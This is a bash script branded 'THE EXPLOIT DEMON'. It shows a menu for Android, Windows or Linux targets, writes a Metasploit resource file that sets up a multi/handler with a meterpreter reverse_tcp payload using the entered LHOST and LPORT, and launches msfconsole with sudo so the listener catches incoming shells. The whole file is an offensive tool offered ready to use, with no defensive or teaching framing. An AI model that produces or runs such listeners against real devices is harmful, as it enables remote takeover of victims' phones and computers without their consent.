#!/bin/bash
while :
do
clear
echo -e  "\n\n\e[1;31;48m***************************************** \e[0m"; sleep 1
echo -e  "\e[1;32;48m           THE EXPLOIT DEMON              \e[0m";sleep 1
echo -e  "\e[1;31;48m***************************************** \e[0m";sleep 1
echo -e  "\n\e[1;33;48m 1 ->\e[0m \e[1;34;48m android/meterpreter/reverse_tcp\e[0m"
echo -e  "\e[1;33;48m 2 ->\e[0m \e[1;34;48m windows/meterpreter/reverse_tcp\e[0m"
echo -e  "\e[1;33;48m 3 ->\e[0m \e[1;34;48m linux/x86/meterpreter/reverse_tcp\e[0m"
echo -e  "\e[1;33;48m 4 ->\e[0m \e[1;34;48m EXIT\e[0m\n";sleep 1
read -p "ENTER YOUR CHOICE: " CHOICE
pwde="$1/scrpt"
if [ $CHOICE -eq 1 ]
then 
	echo -e "\n\e[1;34;48m***************************************** \e[0m";sleep 1
	echo -e "\e[1;31;48m      STARTING THE LISTENER FOR ANDROID\e[0m";sleep 1
	echo -e "\e[1;34;48m***************************************** \e[0m";sleep 1
	read -p "ENTER THE LHOST                : " LHOST
	read -p "ENTER THE LPORT                : " LPORT	
	read -p "ENTER THE APK NAME             : " RC
	echo -e "\e[1;36;48mCREATING EXECUTABLE FILE FOR METASPLOIT\e[0m"
	echo `touch $pwde/$RC.rc`
	echo "use exploit/multi/handler" >>  $pwde/$RC.rc
	echo "set payload android/meterpreter/reverse_tcp" >>  $pwde/$RC.rc
	echo "set LHOST $LHOST" >> $pwde/$RC.rc
	echo "set LPORT $LPORT" >> $pwde/$RC.rc
	echo "run" >> $pwde/$RC.rc
	echo -e "\e[1;32;48mPRESS ANY KEY TO EXPLOIT\e[0m"
	read input
	echo `xfce4-terminal --title="METASPLOIT" --color-bg="black" --execute sudo msfconsole -r $pwde/$RC.rc &`
elif [ $CHOICE -eq 2 ]
then    
	
	echo -e "\n\e[1;34;48m***************************************** \e[0m";sleep 1
	echo -e "\e[1;31;48m      STARTING THE LISTENER FOR WINDOWS\e[0m";sleep 1
	echo -e "\e[1;34;48m***************************************** \e[0m";sleep 1
	read -p "ENTER THE LHOST                : " LHOST
	read -p "ENTER THE LPORT                : " LPORT	
	read -p "ENTER THE APK NAME             : " RC
	echo -e "\n\e[1;36;48mCREATING EXECUTABLE FILE FOR METASPLOIT\e[0m";sleep 2
	echo `touch $pwde/$RC.rc`
	echo "use exploit/multi/handler" >>  $pwde/$RC.rc
	echo "set payload windows/meterpreter/reverse_tcp" >>  $pwde/$RC.rc
	echo "set LHOST $LHOST" >> $pwde/$RC.rc
	echo "set LPORT $LPORT" >> $pwde/$RC.rc
	echo "run" >> $pwde/$RC.rc
	echo -e "\n\e[1;32;48mPRESS ANY KEY TO EXPLOIT\e[0m"
	read input
	echo `xfce4-terminal --title="METASPLOIT" --color-bg="black" --execute sudo msfconsole -r $pwde/$RC.rc &`
	
elif [ $CHOICE -eq 3 ]
then    
	echo -e "\n\e[1;34;48m***************************************** \e[0m";sleep 1
	echo -e "\e[1;31;48m      STARTING THE LISTENER FOR LINUX\e[0m";sleep 1
	echo -e "\e[1;34;48m***************************************** \e[0m";sleep 1
	read -p "ENTER THE LHOST                : " LHOST
	read -p "ENTER THE LPORT                : " LPORT	
	read -p "ENTER THE APK NAME             : " RC
	echo -e "\n\e[1;36;48mCREATING EXECUTABLE FILE FOR METASPLOIT\e[0m";sleep 2
	echo `touch $pwde/$RC.rc`
	echo "use exploit/multi/handler" >>  $pwde/$RC.rc
	echo "set payload linux/x86/meterpreter/reverse_tcp" >>  $pwde/$RC.rc
	echo "set LHOST $LHOST" >> $pwde/$RC.rc
	echo "set LPORT $LPORT" >> $pwde/$RC.rc
	echo "run" >> $pwde/$RC.rc
	echo -e "\n\e[1;32;48mPRESS ANY KEY TO EXPLOIT\e[0m"
	read input
	echo `xfce4-terminal --title="METASPLOIT" --color-bg="black" --execute sudo  msfconsole -r $pwde/$RC.rc &`
elif [ $CHOICE -eq 4 ]
then
        echo -e "\n\e[1;36;48m<=======\e[0m\e[1;35;48mEXITING\e[0m\e[1;36;48m========>\e[0m\n"
        read input
        exit

fi
done
